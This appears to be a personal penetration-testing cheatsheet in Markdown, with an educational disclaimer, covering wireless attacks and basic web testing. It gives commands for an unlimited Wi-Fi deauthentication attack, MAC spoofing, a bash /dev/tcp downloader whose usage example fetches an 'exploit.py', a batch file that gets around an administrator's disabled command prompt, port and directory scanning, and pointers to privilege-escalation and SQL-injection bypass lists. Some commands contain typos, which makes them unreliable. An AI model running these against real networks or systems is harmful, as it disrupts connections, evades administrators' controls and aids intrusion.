# Useful Cheatsheet

> #### Disclaimer
> 
> For Academic and Educational Purposes Only

Cheatsheet under my development, contributing regularily. Trying to include things that are hard to remember, tricks and basic utilities and how to use them. All in one place.

## Table of Contents

- [Table of Contents](#table-of-contents)
- [Networking stuff](#networking-stuff)
  - [Show my wireless card name](#show-my-wireless-card-name)
  - [Put wireless card on monitor mode](#put-wireless-card-on-monitor-mode)
  - [Show routers in range](#show-routers-in-range)
  - [Show devices connected to a specific router](#show-devices-connected-to-a-specific-router)
  - [Create deauth attack](#create-deauth-attack)
  - [Change MAC address](#change-mac-address)
  - [Host DarkWeb, Secret chat](#host-darkweb-secret-chat)
- [System compromising](#system-compromising)
  - [curl or wget without the function itself](#curl-or-wget-without-the-function-itself)
  - [Get cmd in Windows if not enabled by administrator](#get-cmd-in-windows-if-not-enabled-by-administrator)
- [Web Penetration Testing](#web-penetration-testing)
  - [Basic Steps to Rule the World](#basic-steps-to-rule-the-world)
  - [Scanning the machine](#scanning-the-machine)
  - [Using DirBuster](#using-dirbuster)
  - [Validating a form and a button if it is disabled](#validating-a-form-and-a-button-if-it-is-disabled)
  - [List of vulnerable Unix libraries, to for example get root access](#list-of-vulnerable-unix-libraries-to-for-example-get-root-access)
  - [SQL injection auth bypass](#sql-injection-auth-bypass)


## Networking stuff

### Show my wireless card name
```
iwconfig
```

### Put wireless card on monitor mode
```
airmon-ng start {card name}
```

### Show routers in range
```
airdump-ng {card name}
```
- PWR column is showing signal strenght
- Note also the channel and BSSID of the router

### Show devices connected to a specific router
```
airodump-ng {card name} --bssid {router BSSID} --channel {router channel}
```
- router is also included there

### Create deauth attack
```
aireplay-ng --deauth 0 -c {devices MAC} -a {routers MAC ADDRESS} {card name}
```
- possibility to include more routers and more MAC adresses
- 0 means infinite number of deauth messages
- TIP of the day: put for example 50 insted of 0 and replay it with 1 second delay

### Change MAC address
```
sudo ifconfig {interface} down
sudo ifconfig {interface} hw ether {MAC address}
sudo ifconfig {interface} up
```

### Host DarkWeb, Secret chat
- use onionshare

## System compromising

### curl or wget without the function itself
```bash
function __curl() {
  read proto server path <<<$(echo ${1//// })
  DOC=/${path// //}
  HOST=${server//:*}
  PORT=${server//*:}
  [[ x"${HOST}" == x"${PORT}" ]] && PORT=80
 
  exec 3<>/dev/tcp/${HOST}/$PORT
  echo -en "GET ${DOC} HTTP/1.0\r\nHost: ${HOST}\r\n\r\n" >&3
  (while read line; do
   [[ "$line" == $'\r' ]] && break
  done && cat) <&3
  exec 3>&-
}
 
 
# USAGE: __curl http://www.example.com/exploit.py > sploitz.py
```
### Get cmd in Windows if not enabled by administrator
- Create a file `something.bat` with following content
```
@echo off
:a
Set /p comm=cmd~
%comm%
Goto a
```

## Web Penetration Testing

### Basic Steps to Rule the World

1. Get basic information about the targer, use it as it is
2. Scan the machine, how many ports are open?
3. Find all directiories - DirBuster
4. To be done

### Scanning the machine

```
nmap -sV {IP ADDRESS}
```

- This provides information about services version are which ports are in use, all in once

### Using DirBuster

- Used for detecting all folders, even the hidden ones

```
dirbuster dir -u {IP ADDRESS} -l {WORDLIST PATH}
```


### Validating a form and a button if it is disabled

- Console will fix this problem

```
var inputField = document.querySelector('input[type="..."][name="..."]');
if (inputField) {
  inputField.removeAttribute("disabled");
}
```

- Run this for both, button and input field and it will be enabled


### List of vulnerable Unix libraries, to for example get root access

- https://gtfobins.github.io/

### SQL injection auth bypass 

 Check this [list](./files/web_pentesting/sqli_auth_bypass_list.txt).
